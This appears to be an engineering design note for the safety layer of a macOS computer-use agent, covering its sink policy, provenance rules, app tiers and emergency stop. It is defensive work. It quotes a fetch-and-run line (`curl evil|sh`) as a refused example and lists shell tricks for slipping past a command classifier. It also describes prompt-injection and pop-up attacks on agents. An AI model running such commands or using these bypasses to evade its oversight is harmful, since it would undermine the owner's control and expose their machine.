# T10: computer-use foundations

Written 2026-10-09. Stage 1 work (one excellent worker): verification and
safety for the computer-use goal. It adds no new product claims; identity is
in `VISION.md`. Source tricks: `docs/research/trick_book_2026-10.md` §1 #9,
§2.8, §2.9, §3 combination 5, and `docs/research/local_first_architecture_2026-10.md`
§2.6.

Code: `scaffold/agent/desktop/` (`probes.py`, `policy.py`, `enforce.py`,
`ax_compress.py`, `ax_observe.py`, `sends.py`, `ui_session.py`,
`app_policy.py`, `stop.py`, `fake_backend.py`, `chores.py`). No LLM is
called anywhere in this package. Nothing in it is wired into the
orchestrator yet; the desktop session (§7) runs on fakes only.

## 1. Research basis (brief)

| Idea | Source | What we take | What we leave |
|---|---|---|---|
| Getter + comparator checkers | OSWorld (arXiv 2404.07972): per-task `getter` that reads the VM end state (file, app config, sqlite, AX/DOM) and a `metric` function that compares it to an expected value | The two-part JSON probe; getters read the world, never the agent's transcript | VM orchestration |
| macOS end-state checks; deceptive pop-ups | macOSWorld (arXiv 2506.04135): AppleScript/shell-based checks; pop-ups distract agents 58–72% of the time | `defaults`, plist, AX via System Events as getters; confirmations instead of trusting the model to resist pop-ups | Pixel-based pop-up tasks |
| Parameterised state checks | AndroidWorld (arXiv 2405.14573): checks read app databases (sqlite) and are parameterised per task instance | `sqlite_query` getter, read-only; probes parameterised in the chore JSON | Android emulator |
| Rule checker vs LLM judge | Trick Book §1 #9: rule checkers ~83.8% precision vs ~69% for LLM judges | Deterministic probes are the default gate | — |
| Privilege DSL, default deny | Progent (arXiv 2504.11703): attack success 41% → 2% with per-tool allow/deny policies | Action classes + owner grants; irreversible classes denied unless granted | Its LLM-generated policy updates |
| Provenance / capabilities | CaMeL (arXiv 2503.18813), Enterprise CaMeL (2505.22852): untrusted data must not choose a sink | Each action carries initiator + argument provenance; untrusted initiator → deny; untrusted argument → ask | The full planner / quarantined-LLM split (costs weak planners ~21pp, §2.9) |
| Runtime rules | AgentSpec (arXiv 2503.18666) | Rule IDs and an audit trail per decision | Its rule language |
| AX-tree compression | A11y-Compressor (arXiv 2605.00551): ~22% of raw tokens; redundancy-only arm neutral on success, full pipeline +5.1pp on a 32B model | Drop invisible/empty, dedup, reading order, indices, centres | Its pixel-band app rules (replaced by native AXSheet/AXDialog roles) |
| API-first ladder | UFO2 (2504.14603), CoAct-1 (2508.03923: 10.15 vs 15 steps) | Rung tag on each chore (`shell`, `applescript`, `ax`, `pixels`) | Speculative batching (≈0 effect) |

## 2. macOS hooks (verified on this machine, Darwin 25.5, no installs)

| Hook | Verified | Use |
|---|---|---|
| `osascript` (AppleScript) | yes (`return 1+1` → 2) | rung 2 actions; AX getters |
| `osascript -l JavaScript` (JXA) | yes | rung 2 actions with JSON output |
| `defaults read/write <abs plist path>` | yes, on a scratch plist | `defaults_read` getter; chore c09 |
| `shortcuts list` | yes (lists user shortcuts) | rung 2 actions (not yet used by a probe) |
| `mdls -raw -name` | yes (`kMDItemContentType`) | `mdls` getter |
| `sqlite3` CLI / Python `sqlite3` | yes (3.51.0) | `sqlite_query` getter (opened `mode=ro`) |
| `pgrep -x` | yes | `process_running` getter |
| System Events, frontmost process | yes | `frontmost_app` getter |
| System Events, AX attributes of UI elements | **blocked**: "osascript is not allowed assistive access (-1719)" | `ax_attribute` getter fails closed until the owner grants Accessibility to the host process |
| Playwright | not installed | C10 uses a saved-DOM form chore instead of a live browser |

## 3. Probes (`probes.py`)

Probe spec:

```json
{"id": "port_9090",
 "getter":     {"type": "ini_value", "path": "config/settings.ini", "section": "server", "key": "port"},
 "comparator": {"op": "equals", "expected": "9090"}}
```

Getters: `file_exists`, `file_content`, `file_hash`, `glob`, `json_value`,
`plist_value`, `ini_value`, `sqlite_query` (read-only, scalar/row/rows),
`defaults_read`, `process_running`, `ax_attribute`, `frontmost_app`, `mdls`,
`html_field` (form control value in a saved DOM). The live-desktop getters
are `process_running`, `ax_attribute` and `frontmost_app`.

Comparators: `equals`, `not_equals`, `contains`, `regex`, `approx`
(absolute tolerance), `set_equals`, `length`, `truthy`, `glob_match`.

Rules:

- Relative paths resolve against the state root given to `holds(root)`.
- A getter error makes the probe **fail**, never pass. This matters for
  `not_equals`.
- `ax_attribute` only accepts plain-word element paths, so no AppleScript
  can be injected through the spec.
- **Validity (V1, must-fail-first):** a probe is valid for a chore only if
  it FAILS on the start state and PASSES on the verified end state
  (`validate_probe`). A chore may also list **invariants** ("other settings
  kept"), which must pass on both states. Invariants guard against
  collateral damage. They are not done-signals.

## 4. Sink policy (`policy.py`)

Action classes (`ActionClass`): `read`, `write_sandbox`, `write_outside`,
`network_egress`, `send`, `delete`, `credential`, `payment`, `git_push`,
`opaque_code` (code or input the classifier cannot see into: inline
interpreter code, a shell reading stdin, an unknown key chord, a clickable
with no label or role, anything typed into a terminal), `ui_action` (a
reversible click / keystroke / typing in an app) and `destructive_ui`
(clicking a destructive control: Delete, Discard, Don't Save, Empty Trash,
and consent buttons such as Merge, Approve, Accept, Allow). The irreversible
set is egress, send, delete, credential, payment, push, opaque_code and
destructive_ui. `ALWAYS_ASK` (confirm even with a grant) is payment,
credential, opaque_code and destructive_ui.

Provenance: `owner` (the goal, explicit grants), `agent` (derived from owner
input and trusted tool output), `untrusted` (screen, web, documents, email,
AX values). Each action carries its **initiator** provenance and the
provenance of each **argument**.

Decision order (first match wins; every decision is audited):

| Rule id (as audited) | Condition | Verdict |
|---|---|---|
| `R0-empty` | `decide_command` of an empty command | allow |
| `R1-read` | read | allow |
| `R2-sandbox` | write inside sandbox (realpath check; a path outside it becomes `write_outside`) | allow |
| `R3-untrusted-trigger` | initiator untrusted and the class is above sandbox writes | **deny** |
| `R4-critical-point` | payment / credential / opaque_code / destructive_ui | **ask**, even with a grant |
| `R4-elevated-app` | (Enforcer, `force_ask`) any action in an elevated-risk app (password managers) that R1–R6 would allow | **ask** |
| `R5-grant` / `R5-untrusted-arg` | owner grant matches (class + target glob): all args trusted → allow; any untrusted arg → ask | allow / ask |
| `R6-default-deny` | no grant, irreversible class | **deny** |
| `R6-write-outside` | no grant, write outside the sandbox | ask |
| `R6-ui-ungranted` | no grant, ui_action (grants are per app: `app:<bundle id>/*`) | ask |
| `R6-unknown-risk` | no grant, any class without its own rule (never defaults to allow) | ask |
| `R7-untrusted-allowlist` | shell commands only: provenance untrusted (initiator or any argument) and R1–R6 said allow, but the command is not on the read-only **allowlist** | **ask** |

Desktop UI actions are mapped to these classes by `classify_ui_action`
(chord table and word lists in the `policy.py` docstring; §7.1 for terminals); a send-like control is `send` and only ever goes through the
two-phase broker. Provenance of typed and sent values is computed, not just
declared (§7.6).

**Untrusted shell = allowlist, not classifier (R7).** The classifier is a
deny-list and two review rounds kept finding sinks it missed (wrapped `cd`,
sed `e`/`w` after an address, `GIT_CONFIG_*` env, `source` of a file written
earlier in the chain, `pushd +N`, ...). So for untrusted provenance a shell
command is allowed only if every simple command in it (split on `; && || |`
and newlines) is on `untrusted_shell_violation`'s list:

| Program | Constraint |
|---|---|
| `ls`, `cat`, `head`, `tail`, `wc` | every operand and `--opt=value` resolves (realpath) inside the sandbox |
| `echo`, `pwd`, `true` | none (print only) |
| `grep`, `egrep`, `fgrep`, `rg` | every operand, the pattern included unless given by `-e`/`--regexp=`, is a path inside the sandbox; `-f FILE` inside; `rg --pre`/`-z` refused |
| `pytest`, `py.test`, `python[3[.N]] -m pytest` | options from a short list (`-q -v -x -s -l -rX -k -m -n --tb= --lf --ff --co ...`); test paths (before `::`) inside; `-p -c -o --rootdir --basetemp` etc. refused; not in a chain that also writes a file |
| `git status/diff/log/show` | no global options (`-c`, `-C`, `--git-dir`, `--exec-path`), no env prefix, no `--output`, `--ext-diff`, `--no-index`, `-O`, `--textconv` (or an abbreviation of one); no absolute, `~` or `..` operands |

The whole command must also have no expansion of any kind (`$`, backticks or
`\` outside single quotes; `( ) { } # ! ^` outside quotes), no `VAR=value`
prefix, no program given by path, no `&`, heredoc or fd tricks, and
redirections only to `/dev/null` or to sandbox files that are not dotfiles or
dot-dirs, not test/build config (`conftest.py`, `pyproject.toml`, ...) and not
code (`.py`, `.sh`, `.pth`, ...). State-changing builtins (`cd`, `pushd`,
`source`, `.`, `exec`, `eval`, `trap`, `alias`, `export`) are simply not on
the list. Anything else is ask; a deny from R3/R6 (send, delete, egress,
push, credential, payment, opaque code) still stands. Any parse surprise is
a violation (fail closed). `tests/test_desktop_policy_allowlist.py` holds the
table of every bypass from both reviews (all ask/deny) and of ordinary
read-only commands (all allow).

**Owner/agent provenance** keeps the classifier and R1–R6, with the
push-destination fix: a `git push` whose destination the command may have
changed (`git -c remote.*.url/pushurl`, `url.*.insteadOf/pushInsteadOf`,
`--git-dir`, `--work-tree`, `-C` outside, `GIT_DIR`/`GIT_WORK_TREE`, an
earlier `git remote set-url/add` or `git config remote.*` in the chain, a
`cd` out of the sandbox, `CDPATH`) has target `redirected:<remote>`, which an
`origin*` grant does not match, so R6 denies it. `git remote add/set-url` and
`git config` of a remote/url key or of `--global/--system/--file` are
`write_outside` (ask) on their own. `GIT_CONFIG_*`, `GIT_EXEC_PATH`,
`git config <command key>`, `git -c include.path`, `git --exec-path=`, sed
`e`/`s///e` (with any address) and `sed -f` are opaque; sed `w`/`W`/`s///w`
are writes to their file. `cd` behind `builtin`/`command`/`exec`/`nice`/`eval`,
`CDPATH`, and `pushd +N`/`-N` count as leaving the sandbox.

Grants can only carry `owner` provenance; building one from untrusted text
raises an error. `classify_command` maps shell commands (rung 1) to
(class, target) pairs: `git push`, curl/ssh/…, rm/trash, `security find-*`,
`osascript … send`, redirections. `decide_command` takes the worst verdict.
The policy never reads content, so it cannot be argued with. On-screen text
is untrusted by construction.

Audit record (JSONL, one per decision): `ts, verdict, rule, reason,
action_class, target, initiator, arg_sources, description, grant_id`.

## 5. AX compression (`ax_compress.py`)

Steps: drop hidden, zero-area and clipped-out nodes (visible-rect rules in
§7.5) → drop empty non-interactive nodes and promote their children →
collapse runs of identical static-text siblings into one element with a
repeat count (interactive elements are never collapsed) → reading order
(modal sheet/dialog first, then 10 px row bands, then left to right) →
indices and centre coordinates.

Output line: `[3] button "Save" @(412,288) disabled focused selected partial MODAL x6`
(screen text JSON-quoted).
`diff`/`no_progress` compare two observations. An empty diff after an action
is the heuristic no-progress signal for open item G. On the synthetic Finder
tree in the tests, the output is **8.4%** of the raw JSON tokens. That tree
is padded with empty wrappers, so the number does not predict real apps;
the test only asserts <25%.

## 6. C10 smoke set (`tests/fixtures/desktop_chores/`)

Each chore directory holds `chore.json` (instruction, rung, start state,
probes, invariants) and `solve.py` (scripted reference, run with
`cwd = scratch`). Run all of them with
`python -m scaffold.agent.desktop.chores`.

| id | Chore | Probe getters | Rung |
|---|---|---|---|
| c01 | rename screenshots by pattern | glob set, file content | shell |
| c02 | sort Downloads by extension | glob set ×3 (+ nothing-deleted invariant) | shell |
| c03 | CSV → JSON | json length, value, approx | shell |
| c04 | INI port edit | ini value (+ 2 keep invariants) | shell |
| c05 | plist toggle | plist values (+ keep invariant) | shell |
| c06 | create ICS event | exists, regex ×4 | shell |
| c07 | fill HTML form, no submit | html_field ×5 | ax (saved DOM) |
| c08 | SQLite mark task done | sqlite scalar + rows (+ row-count invariant) | shell |
| c09 | `defaults write` on a scratch domain (darwin only) | defaults_read, plist value | applescript |
| c10 | extract ERROR lines | sha256 hash, regex (+ log-untouched invariant) | shell |

**Validation result (2026-10-09): 10/10 valid.** Every probe fails on start
and passes after the reference solution; every invariant holds on both
states. Validation also caught a real getter bug: `<option selected>` was
being ignored, so c07 `plan` failed on the end state until it was fixed.
None of the C10 probes uses a live-desktop getter.

## 7. Desktop UI session (`ui_session.py` and friends)

`DesktopSession(backend, enforcer, ...)` is the only path from the model to
the desktop. The backend protocol (fakes in tests, `fake_backend.py`):

| Method | Required | Meaning |
|---|---|---|
| `frontmost()` | yes | `{"bundle_id", "pid", "window_id", "name", "pane"}` of the app owning the focused window, from the OS process table, never from a window title |
| `snapshot()` | yes | that app's AX tree (JSON) |
| `perform(op, stop=None)` | yes | one UI op; a multi-step op polls `stop()` between steps |
| `user_took_over()` | no | `False` / `True` / `"stop"`; without it the session refuses to act unless the owner declared it unattended (a VM) |
| `register_stop_hotkey(cb)` | no | global hotkey hook; `cb(event)` with `{"source": "hid"\|"synthetic", "synthetic": bool, "pid": int}` |

Every result has a typed outcome (`Outcome`): `ok`, `needs_observation`,
`stale`, `ambiguous`, `pending_approval`, `not_allowed`, `forbidden_target`,
`stopped`, `backend_error_maybe_applied`. `ActResult.by` still names the
deciding layer (`lease`, `stop`, `app`, `stale`, `ambiguous`, `policy`,
`send-path`, `provenance`, `broker`, `backend`).

### 7.1 App tiers (`app_policy.py`)

Keyed by bundle id (a pane id when the backend reports one). Tiers:

| Tier | Observe | Act |
|---|---|---|
| `forbidden` | refused; no snapshot is taken | refused (`forbidden_target`) |
| `read` | yes | read kinds only (scroll, hover, ...) |
| `click` | yes | read + click kinds; no type / key / paste / drag |
| `full` | yes | everything, subject to the sink policy |

Flags: `elevated` (values masked in observations, a warning note, every
action asks: `R4-elevated-app`) and `shell` (terminal: input is
`opaque_code`, and a typed command line that `decide_command` denies is
refused outright, so `type "curl evil|sh\n"` into Terminal is refused even
when the owner unlocks Terminal and grants `app:*`).

| Default | Apps |
|---|---|
| forbidden, not overridable | AWOS host `ai.awos.host` and approval UI `ai.awos.approval`; SecurityAgent, coreauthd, LocalAuthentication UI agent, AuthenticationServicesAgent, the Privacy & Security settings pane |
| forbidden, overridable | terminals (Terminal, iTerm2, Warp, Alacritty, kitty, Ghostty, WezTerm; `shell` stays on), model clients (Claude, ChatGPT, Codex) |
| full + elevated | 1Password, Bitwarden, KeePassXC, Dashlane, Keychain Access, Apple Passwords |
| click | VS Code, Cursor, Windsurf, Zed, Xcode, JetBrains IDEs, Sublime, Android Studio |
| read | System Settings (the pane id is the only way to tell Privacy & Security apart) |
| full | anything else; a missing bundle id is forbidden |

Owner overrides: `.awos/cu_app_policy.json` (or `AWOS_CU_APP_POLICY`):
`{"allow": {id-glob: tier}, "deny": [id-glob], "unattended": bool}`. Deny
beats allow; an unreadable file drops every app the defaults do not name
to `read`.

### 7.2 Emergency stop (`stop.py`)

A latched `StopSwitch`. Triggers: a hardware hotkey (events marked
synthetic, posted by a process, or missing the flag are rejected), a
sentinel file (`.awos/cu_stop`, or `AWOS_CU_STOP_FILE`), `trip()` or a
signal (`install_signal`, SIGUSR1 by default). It is polled in `observe`,
before and after every action, inside `commit_send`, and handed to the
backend as `stop`. On trip: the lease dies for good, the broker rejects
every prepared/approved send and refuses new ones, and audit records
(`kind: cu_stop`) are written. No agent-reachable method clears it; the
module function `owner_reset()` does, refuses while the sentinel exists,
and only serves a new session.

### 7.3 Turn lease and takeover

Acting needs an observation from this turn that is newer than the last
action and the last takeover. A takeover moves the session to `yielded`:
it must re-read and then wait `quiet_period` seconds (default 3) with no
further user input. `end_turn()` closes the lease until `begin_turn()`. A
takeover hook answering `"stop"` trips the stop switch. Hosts must not
report input to AWOS's own approval window as a takeover, or every approval
would yield.

### 7.4 Action-time checks

After the policy allows and right before `perform`: stop, takeover and
lease again; the backend's frontmost app and window must be the observed
one (`stale` otherwise). After any approval wait the session takes a fresh
snapshot and the target id must resolve to the same role / label /
ancestors / row content, in the same app window (`stale` otherwise).
`commit_send` does the same.

### 7.5 Perception

- Visible rect through every clipping ancestor (window, web area, scroll
  area); keep an element when ≥5% or ≥100 pt² of it is visible (a window
  500 pt²); click centre = centre of the visible rect; partly visible
  elements are marked `partial`; focused/selected elements are kept even
  when clipped (`offscreen`, no centre, at most 10).
- Stable IDs add the content of the nearest unlabelled row to the key.
  When the size of a same-key group changes, its IDs are `ambiguous` and
  actions on them are refused until a later full observation.
- Static text runs are still collapsed (`x3`); interactive elements never.
- Screen text is JSON-quoted (`<`/`>` escaped); each observation's screen
  content sits inside a nonce-tagged `<untrusted-screen-content>` fence;
  the focused field gets a `focused:` line with up to 2000 characters of
  its value plus a `selected text:` line.
- Secure text fields, password inputs and card fields never carry a value
  (`secure =<hidden>`); key / token / card-number patterns are redacted in
  all other text; typing into a secure field needs owner-provided text and
  is `credential` (asks).
- `observe(full=True)` forces a full tree; every `full_every`-th
  observation (default 10, `AWOS_CU_FULL_EVERY`) is full; `AWOS_CU_DIFF=0`
  turns diffs off. Diffs stay on by default, but whether they help small
  models is untested: **they need an A/B** (same chores, diff on vs off,
  success and tokens per step) before the default is trusted.

### 7.6 Provenance of typed and sent values

`act()` and `prepare_send()` no longer default typed text, recipients and
payloads to `agent`: `policy.provenance_of` marks a value `owner` when an
owner text (the goal, an approved payload) quotes it, `untrusted` when it
was seen on screen but not in owner text, else `agent`; the stricter of
computed and declared wins. A recipient, URL, amount or account number no
owner text quotes counts as an untrusted argument, so the action asks.

### 7.7 Two-phase sends on the UI path

`prepare_send` records which compose field holds each payload part (given
as `fields=` or inferred from field values). `commit_send` re-reads the
screen, writes the approved (maybe owner-edited) text into those fields
when they differ, re-reads again and refuses (`stale`, nothing sent) unless
they hold exactly the approved payload. After the click it reads once more:
compose fields cleared or gone → `verified`; otherwise `unverified`, with a
possible-duplicate warning. The idempotency key is the content hash plus a
per-prepare nonce; the same content is refused only within a time window
(default 10 minutes).

## 8. Risks and open items

- **AX permission.** `ax_attribute` needs Accessibility granted to the host
  process; without it, AX probes fail closed. The live AX rung is unproven
  here.
- **Self-authored chores.** C10 chores and probes were written by the same
  author as the reference solutions, so they are not an independent oracle.
  E9 needs chores written by someone else, plus human labels, before any
  claim about probe precision.
- **Policy coverage.** `classify_command` is static and best-effort (a
  deny-list); for owner/agent provenance unknown programs and scripts run
  from files are still `write_sandbox`. Untrusted provenance does not rely
  on it: R7 allows only the read-only allowlist. Remaining gaps there: a
  malicious `.git/config` or `conftest.py` already in the sandbox still runs
  under `git status/diff` or `pytest`; a file written by one untrusted call
  (or another tool) and executed by a later call is not linked across calls;
  `PATH` entries inside the sandbox could shadow an allowlisted program; glob
  operands are checked as written, so a symlink inside the sandbox that a
  glob expands to can point outside (reads only).
- **Provenance tagging is the caller's job.** The policy is only as good as
  the initiator and argument tags it is given. Wiring them into the
  orchestrator is the next step, and it needs a live proof (per
  `protocols/LIVE_PROOF_PROTOCOL.md`): an injected page attempts a send, and
  the run stops with a deny marker in the audit log.
- **"Data requires action" chores** (§3 combination 5) cannot be fixed
  programs. They need the guarded worker with this policy in front of it.
- Not done here: snapshots/rollback (APFS clones), the Shortcuts rung, and
  Flash-written probes. All are listed in the Trick Book.
- **Desktop session residuals.** Bundle ids are only as trustworthy as the
  backend: an unsigned app can claim any bundle id, so a real backend should
  also check the code-signing team id. The Privacy & Security pane is told
  apart only by a pane id the backend derives from the window. Field
  inference for UI sends matches by value, so two fields with the same text
  need `fields=`. Send verification is a heuristic (compose cleared); an
  app that keeps the text after sending reads as unverified. The stop
  hotkey and takeover hook are protocol only: no real macOS backend exists
  yet. Diff mode needs the A/B above.
